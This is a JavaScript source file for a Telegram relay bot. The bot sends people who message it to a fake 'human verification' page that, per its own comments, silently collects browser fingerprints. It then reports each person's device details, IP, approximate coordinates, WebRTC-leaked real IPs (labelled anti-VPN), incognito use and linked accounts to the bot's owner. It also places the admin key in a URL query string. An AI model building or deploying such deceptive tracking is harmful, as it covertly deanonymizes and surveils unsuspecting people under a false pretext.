import { randToken } from './util.js';

/**
 * 双向中继 Bot:
 *   陌生人 → bot: 未验证则要求"完成人机验证"(展示 Turnstile + 静默采集指纹)
 *                 完成后,后续消息全部转发给 owner
 *   owner → bot: 回复某条转发消息 → bot 帮忙投递给对应用户
 *   任何人 /claim <ADMIN_KEY> → 成为 owner(首次或转移)
 */
export async function handleTelegram(request, env, ctx) {
  const update = await request.json().catch(() => null);
  if (!update?.message) return new Response('ok');
  ctx.waitUntil(dispatch(env, update.message).catch((e) => {
    console.error('tg dispatch error:', e?.stack || e?.message || e);
  }));
  return new Response('ok');
}

async function dispatch(env, msg) {
  const from = msg.from || {};
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();

  // /claim 认领 owner
  if (text.startsWith('/claim')) {
    const arg = text.split(/\s+/)[1];
    if (arg && arg === env.ADMIN_KEY) {
      await setConfig(env, 'owner_id', String(from.id));
      await setConfig(env, 'owner_chat_id', String(chatId));
      return sendMessage(env, chatId,
        `✅ 你已成为本 bot 的 owner\nid: <code>${from.id}</code>\n\n以后所有验证用户的消息会转发到这里,直接回复即可对话。`);
    }
    return sendMessage(env, chatId, '❌ 密钥错误');
  }

  const ownerId = await getConfig(env, 'owner_id');
  if (!ownerId) {
    return sendMessage(env, chatId, '⚙️ Bot 未初始化,请 owner 发送 <code>/claim &lt;ADMIN_KEY&gt;</code> 认领。');
  }

  if (String(from.id) === ownerId) {
    return handleOwner(env, msg, text);
  }
  return handleTarget(env, msg, from, text);
}

/* -------- Owner 侧 -------- */

async function handleOwner(env, msg, text) {
  const chatId = msg.chat.id;

  if (text === '/start' || text === '/help') {
    return sendMessage(env, chatId,
      `👑 <b>Owner 面板</b>\n\n` +
      `• 回复任意转发消息 → 你的回复会被投递给对方\n` +
      `• <code>/users</code> - 已验证用户列表\n` +
      `• <code>/pending</code> - 待验证用户\n` +
      `• <code>/reset &lt;user_id&gt;</code> - 重置某用户验证状态(下次强制重做)`);
  }

  if (text === '/users') {
    const { results } = await env.DB.prepare(
      `SELECT tg_user_id, tg_username, tg_first_name, verified_at
         FROM users WHERE verified_at IS NOT NULL
         ORDER BY verified_at DESC LIMIT 30`
    ).all();
    if (!results.length) return sendMessage(env, chatId, '(暂无已验证用户)');
    const lines = results.map((r) =>
      `• ${escapeHtml(r.tg_first_name || '—')} ${r.tg_username ? '@' + escapeHtml(r.tg_username) : ''} <code>${r.tg_user_id}</code>`);
    return sendMessage(env, chatId, `<b>已验证 ${results.length} 人</b>\n\n${lines.join('\n')}`);
  }

  if (text === '/pending') {
    const { results } = await env.DB.prepare(
      `SELECT tg_user_id, tg_username, tg_first_name, created_at
         FROM users WHERE verified_at IS NULL
         ORDER BY created_at DESC LIMIT 30`
    ).all();
    if (!results.length) return sendMessage(env, chatId, '(无待验证)');
    const lines = results.map((r) =>
      `• ${escapeHtml(r.tg_first_name || '—')} ${r.tg_username ? '@' + escapeHtml(r.tg_username) : ''} <code>${r.tg_user_id}</code>`);
    return sendMessage(env, chatId, `<b>待验证 ${results.length} 人</b>\n\n${lines.join('\n')}`);
  }

  if (text.startsWith('/reset ')) {
    const uid = text.split(/\s+/)[1];
    await env.DB.prepare('UPDATE users SET verified_at = NULL WHERE tg_user_id = ?').bind(uid).run();
    return sendMessage(env, chatId, `已重置 ${uid} 的验证状态`);
  }

  // 回复某条转发消息 → 投递给对应目标
  if (msg.reply_to_message) {
    const row = await env.DB.prepare(
      'SELECT target_chat_id FROM relay_map WHERE owner_msg_id = ?'
    ).bind(String(msg.reply_to_message.message_id)).first();
    if (!row) {
      return sendMessage(env, chatId, '❌ 未找到该消息对应的目标(可能太旧)');
    }
    return relayToTarget(env, chatId, row.target_chat_id, msg);
  }

  return sendMessage(env, chatId, '💡 请回复某条被转发的消息来回复对方,或用 /help 查看命令。');
}

/* -------- 目标用户侧 -------- */

async function handleTarget(env, msg, from, text) {
  const uid = String(from.id);
  const chatId = String(msg.chat.id);
  const firstName = [from.first_name, from.last_name].filter(Boolean).join(' ') || null;

  // upsert users
  await env.DB.prepare(
    `INSERT INTO users (tg_user_id, tg_chat_id, tg_username, tg_first_name, created_at)
     VALUES (?,?,?,?,?)
     ON CONFLICT(tg_user_id) DO UPDATE SET
       tg_chat_id = excluded.tg_chat_id,
       tg_username = excluded.tg_username,
       tg_first_name = excluded.tg_first_name`
  ).bind(uid, chatId, from.username || null, firstName, Date.now()).run();

  const user = await env.DB.prepare('SELECT * FROM users WHERE tg_user_id = ?').bind(uid).first();

  if (!user.verified_at) {
    // 复用最近未完成的 session,避免每条消息生成新链接
    let session = await env.DB.prepare(
      `SELECT id FROM sessions WHERE tg_user_id = ? AND status = 'pending'
         ORDER BY created_at DESC LIMIT 1`
    ).bind(uid).first();
    let token;
    if (session) token = session.id;
    else {
      token = randToken(24);
      await env.DB.prepare(
        `INSERT INTO sessions (id, label, tg_chat_id, tg_user_id, tg_username, tg_first_name, created_at, status)
         VALUES (?, '首次验证', ?, ?, ?, ?, ?, 'pending')`
      ).bind(token, chatId, uid, from.username || null, firstName, Date.now()).run();
    }
    return sendMessage(env, msg.chat.id,
      `👋 请先完成人机验证:\n\n${env.BASE_URL}/c/${token}\n\n` +
      `完成后回来发消息即可继续对话。`);
  }

  // 已验证 → 转发到 owner
  const ownerChatId = await getConfig(env, 'owner_chat_id') || await getConfig(env, 'owner_id');
  const header = userMention(user, uid) + '\n\n';

  await relayToOwner(env, ownerChatId, chatId, msg, header);
}

/* -------- 消息中继 -------- */

async function relayToOwner(env, ownerChatId, targetChatId, msg, header) {
  // 文本消息:带头部转到 owner + 记录映射便于回复
  if (msg.text) {
    const sent = await sendMessage(env, ownerChatId, header + escapeHtml(msg.text));
    const mid = sent?.result?.message_id;
    if (mid) await recordRelay(env, mid, targetChatId);
    return;
  }
  // 非文本:先发送 header 说明来源,再用 copyMessage 复制媒体过去
  const noticeSent = await sendMessage(env, ownerChatId, header + `<i>(以下为该用户发来的媒体)</i>`);
  const notifMid = noticeSent?.result?.message_id;
  if (notifMid) await recordRelay(env, notifMid, targetChatId);
  const copied = await tgApi(env, 'copyMessage', {
    chat_id: ownerChatId, from_chat_id: msg.chat.id, message_id: msg.message_id,
  });
  const copyMid = copied?.result?.message_id;
  if (copyMid) await recordRelay(env, copyMid, targetChatId);
}

async function relayToTarget(env, ownerChatId, targetChatId, msg) {
  if (msg.text) {
    await sendMessage(env, targetChatId, msg.text);
  } else {
    // owner 发的媒体也可以转过去
    await tgApi(env, 'copyMessage', {
      chat_id: targetChatId, from_chat_id: msg.chat.id, message_id: msg.message_id,
    });
  }
  // 给 owner 一个静默的 ✓ 反馈
  await tgApi(env, 'setMessageReaction', {
    chat_id: ownerChatId, message_id: msg.message_id, reaction: [{ type: 'emoji', emoji: '✍' }],
  }).catch(() => {});
}

async function recordRelay(env, ownerMsgId, targetChatId) {
  await env.DB.prepare(
    'INSERT OR REPLACE INTO relay_map (owner_msg_id, target_chat_id, created_at) VALUES (?, ?, ?)'
  ).bind(String(ownerMsgId), String(targetChatId), Date.now()).run();
}

/* -------- 从 collect.js 调用:验证完成后通知 owner -------- */

export async function notifyVerified(env, session, fp, linkedUser) {
  const ownerChatId = await getConfig(env, 'owner_chat_id') || await getConfig(env, 'owner_id');
  if (!ownerChatId) return;

  if (session.tg_user_id) {
    await env.DB.prepare(
      `UPDATE users SET verified_at = ?, first_session_id = COALESCE(first_session_id, ?)
         WHERE tg_user_id = ?`
    ).bind(Date.now(), session.id, session.tg_user_id).run();
  }

  if (linkedUser) {
    // 同一设备的第二个 TG 账号:告知 owner 有关联,并提示当前用户无需重复验证
    const primary = userMention(linkedUser, linkedUser.tg_user_id);
    const second = userMention(session, session.tg_user_id);
    await sendMessage(env, ownerChatId,
      `⚠️ <b>多账号关联</b>\n\n` +
      `新验证:${second}\n` +
      `与已验证账号同设备:${primary}\n` +
      `(hw_id 一致,IP: <code>${escapeHtml(fp.ip || '')}</code>)`);
    if (session.tg_chat_id) {
      await sendMessage(env, session.tg_chat_id,
        `✅ 验证完成!现在可以直接发消息了,我会转达给对方。`);
    }
    return;
  }

  const text = buildSummary(env, session, fp);
  await sendMessage(env, ownerChatId, text);

  // 也通知目标用户:验证已完成
  if (session.tg_chat_id) {
    await sendMessage(env, session.tg_chat_id,
      `✅ 验证完成!现在可以直接发消息了,我会转达给对方。`);
  }
}

/* -------- 设备摘要:结构化易读 -------- */

function buildSummary(env, session, fp) {
  const s = fp.signals || {};
  const cf = fp.cf || {};
  const ua = fp.ua || '';

  // 解析 OS
  const uacd = s.hardware?.userAgentData || {};
  let osIcon = '💻', osName = 'Unknown', osVer = '';
  if (/Windows/i.test(ua))       { osIcon = '🪟'; osName = 'Windows'; }
  else if (/Mac OS X|Macintosh/i.test(ua)) { osIcon = '🍎'; osName = 'macOS'; }
  else if (/Android/i.test(ua))  { osIcon = '📱'; osName = 'Android'; }
  else if (/iPhone/i.test(ua))   { osIcon = '📱'; osName = 'iPhone'; }
  else if (/iPad/i.test(ua))     { osIcon = '📱'; osName = 'iPad'; }
  else if (/Linux/i.test(ua))    { osIcon = '🐧'; osName = 'Linux'; }
  if (uacd.platform) osName = uacd.platform;
  if (uacd.platformVersion) osVer = uacd.platformVersion;
  if (uacd.model) osVer = `${uacd.model} ${osVer}`;
  const osLine = `${osIcon} <b>${escapeHtml(osName)}</b>${osVer ? ' ' + escapeHtml(osVer) : ''}${uacd.architecture ? ` <i>(${uacd.architecture}${uacd.bitness ? '/' + uacd.bitness : ''})</i>` : ''}`;

  // 浏览器
  let browser = 'Unknown';
  const brands = uacd.fullVersionList || uacd.brands || [];
  const nice = brands.find((b) => !/Not.*Brand|Chromium/i.test(b.brand || ''));
  if (nice) browser = `${nice.brand} ${nice.version || ''}`;
  else if (/Firefox\/([\d.]+)/i.test(ua)) browser = `Firefox ${RegExp.$1}`;
  else if (/Version\/([\d.]+).*Safari/i.test(ua)) browser = `Safari ${RegExp.$1}`;
  else if (/Chrome\/([\d.]+)/i.test(ua)) browser = `Chrome ${RegExp.$1}`;

  // GPU 简写
  const gpu = shortGPU(s.gpu?.renderer || '');

  // 地点
  const flag = countryFlag(cf.country);
  const geo = [cf.city, cf.region, cf.country].filter(Boolean).join(', ');
  const coord = (cf.latitude && cf.longitude) ? ` (${cf.latitude}, ${cf.longitude})` : '';

  // 电池
  const bat = s.battery
    ? `${Math.round(s.battery.level * 100)}%${s.battery.charging ? ' 🔌充电中' : ''}`
    : '—';

  // 存储
  const storage = s.storage?.quota ? formatBytes(s.storage.quota) : '—';

  // 编解码/DRM 提示归属
  const drmFlags = [];
  if (s.eme?.['com.widevine.alpha']?.supported) drmFlags.push('Widevine');
  if (s.eme?.['com.microsoft.playready']?.supported) drmFlags.push('PlayReady');
  if (s.eme?.['com.apple.fps.1_0']?.supported || s.eme?.['com.apple.fps.2_0']?.supported) drmFlags.push('FairPlay');

  // 语言
  const langs = (s.languages || []).slice(0, 3).join(', ') || s.language || '—';

  // 传感器/触屏
  const isTouch = (s.hardware?.touchPoints || 0) > 0;
  const isMobile = /mobile|iphone|android/i.test(ua) || uacd.mobile;

  // Turnstile 状态图标
  const tsIcon = fp.turnstileOk === true ? '✅' : fp.turnstileOk === false ? '❌' : '⚪️';

  // 风险
  const riskPct = Math.round(fp.botScore * 100);
  const riskIcon = riskPct >= 60 ? '🔴' : riskPct >= 30 ? '🟡' : '🟢';
  const riskFlags = [];
  if (s.webdriver) riskFlags.push('webdriver');
  if (s.headless?.userAgentHasHeadless) riskFlags.push('headless');
  if (/swiftshader|llvmpipe/i.test(s.gpu?.renderer || '')) riskFlags.push('软件渲染');
  if (s.automationHooks?.cdc) riskFlags.push('Puppeteer');
  if (fp.incognito) riskFlags.push('隐身');

  // WebRTC 泄露(反 VPN)
  const rtcIps = (s.webrtc?.ips || []).filter((x) => x && x !== fp.ip);

  const link = `${env.BASE_URL}/?key=${env.ADMIN_KEY}`;

  return [
    `✅ <b>新用户验证完成</b>`,
    ``,
    `<b>👤 用户</b>`,
    userMention({ tg_first_name: session.tg_first_name, tg_username: session.tg_username }, session.tg_user_id),
    ``,
    `<b>🖥️ 设备</b>`,
    `系统: ${osLine}`,
    `浏览器: <b>${escapeHtml(browser)}</b>`,
    `GPU: <code>${escapeHtml(gpu.slice(0, 50) || 'N/A')}</code>`,
    `屏幕: ${escapeHtml(s.screen?.resolution || '?')} · ${s.screen?.colorDepth || '?'}bit · DPR ${s.screen?.dpr || '?'}`,
    `硬件: ${s.hardware?.cores || '?'} 核 CPU · ${s.hardware?.memory || '?'} GB RAM${isTouch ? ` · ${s.hardware.touchPoints} 触点` : ''}`,
    `类型: ${isMobile ? '📱 移动设备' : '💻 桌面'} · 电池 ${bat} · 存储 ${storage}`,
    drmFlags.length ? `DRM: ${drmFlags.join(' · ')}` : null,
    ``,
    `<b>📍 网络位置</b>`,
    `${flag} ${escapeHtml(geo || '?')}${coord}`,
    `IP: <code>${escapeHtml(fp.ip)}</code>`,
    `ASN: ${cf.asn || '?'}${cf.asOrganization ? ` (${escapeHtml(cf.asOrganization)})` : ''}`,
    `CF 节点: ${cf.colo || '?'} · RTT ${cf.clientTcpRtt || '?'}ms · ${cf.httpProtocol || '?'} · ${cf.tlsVersion || '?'}`,
    rtcIps.length ? `⚠️ WebRTC 泄露 IP: <code>${escapeHtml(rtcIps.join(', '))}</code>` : null,
    ``,
    `<b>🌐 环境</b>`,
    `时区: ${escapeHtml(s.timezone || '?')} (UTC${s.timezoneOffset >= 0 ? '-' : '+'}${Math.abs((s.timezoneOffset || 0) / 60)})`,
    `语言: ${escapeHtml(langs)}`,
    `主题: ${s.cssMedia?.colorScheme || '?'}${s.cssMedia?.reducedMotion ? ' · 减少动画' : ''}${s.cssMedia?.forcedColors ? ' · 高对比' : ''}`,
    `字体: ${s.fonts?.count || 0} 种检测到`,
    ``,
    `<b>🔒 风控</b>`,
    `机器人风险: ${riskIcon} <b>${riskPct}%</b>${riskFlags.length ? ` · ${riskFlags.join(', ')}` : ''}`,
    `Turnstile: ${tsIcon} ${fp.turnstileOk === true ? '通过' : fp.turnstileOk === false ? '未通过' : '未提交'}`,
    fp.incognito ? `⚠️ 隐身模式访问` : null,
    ``,
    `<b>🆔 标识</b>`,
    `visitorId: <code>${(fp.visitorId || '').slice(0, 20)}…</code>`,
    `设备指纹: <code>${(fp.crossId || '').slice(0, 20)}…</code>`,
    ``,
    `<a href="${link}">🔗 完整详情面板</a>`,
    ``,
    `<i>此人后续消息将自动转发到本对话,直接回复即可对话。</i>`,
  ].filter((x) => x !== null).join('\n');
}

/**
 * 生成可点击的用户标识 —— 点名字 = 打开资料页
 * TG 官方文档支持 <a href="tg://user?id=X">Name</a> 作为 text_mention
 */
function userMention(user, uid) {
  const name = escapeHtml(user.tg_first_name || user.tg_username || `用户 ${uid}`);
  const link = `<a href="tg://user?id=${uid}">${name}</a>`;
  const uname = user.tg_username
    ? ` · <a href="https://t.me/${escapeHtml(user.tg_username)}">@${escapeHtml(user.tg_username)}</a>`
    : '';
  return `👤 <b>${link}</b>${uname} <code>${uid}</code>`;
}

function shortGPU(g) {
  if (!g) return '';
  return g.replace(/ANGLE \(|Direct3D\d+ vs_[\d_]+ ps_[\d_]+\)/g, '').replace(/\)$/, '').replace(/\s+/g, ' ').trim();
}

function countryFlag(cc) {
  if (!cc || cc.length !== 2) return '🌍';
  return String.fromCodePoint(...[...cc.toUpperCase()].map((c) => 0x1F1E6 + c.charCodeAt(0) - 65));
}

function formatBytes(n) {
  const u = ['B', 'KB', 'MB', 'GB', 'TB'];
  let i = 0;
  while (n >= 1024 && i < u.length - 1) { n /= 1024; i++; }
  return `${n.toFixed(1)} ${u[i]}`;
}

/* -------- 底层 -------- */

async function tgApi(env, method, payload) {
  if (!env.TELEGRAM_BOT_TOKEN) return null;
  const r = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/${method}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(payload),
  });
  return r.json().catch(() => null);
}

function sendMessage(env, chatId, text) {
  return tgApi(env, 'sendMessage', {
    chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true,
  });
}

async function getConfig(env, key) {
  const r = await env.DB.prepare('SELECT value FROM config WHERE key = ?').bind(key).first();
  return r?.value || null;
}
async function setConfig(env, key, value) {
  await env.DB.prepare(
    'INSERT INTO config (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
  ).bind(key, value).run();
}

function escapeHtml(s) {
  return String(s ?? '').replace(/[&<>]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));
}
